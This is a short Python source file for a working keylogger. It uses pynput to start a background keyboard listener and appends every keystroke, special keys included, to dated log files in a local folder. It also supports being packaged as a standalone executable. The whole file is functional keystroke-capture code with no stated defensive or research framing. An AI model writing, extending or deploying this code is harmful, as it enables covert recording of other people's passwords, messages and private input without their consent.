from pynput import keyboard
import os
from datetime import datetime
import sys

def get_base_path():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

log_dir = os.path.join(get_base_path(), "logs")
os.makedirs(log_dir, exist_ok=True)

def get_log_file():
    current_date = datetime.now().strftime("%Y-%m-%d")
    return os.path.join(log_dir, f"keylog_{current_date}.txt")

def on_press(key):
    try:
        with open(get_log_file(), "a", encoding="utf-8") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(get_log_file(), "a", encoding="utf-8") as f:
            f.write(f"[{key}]")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener
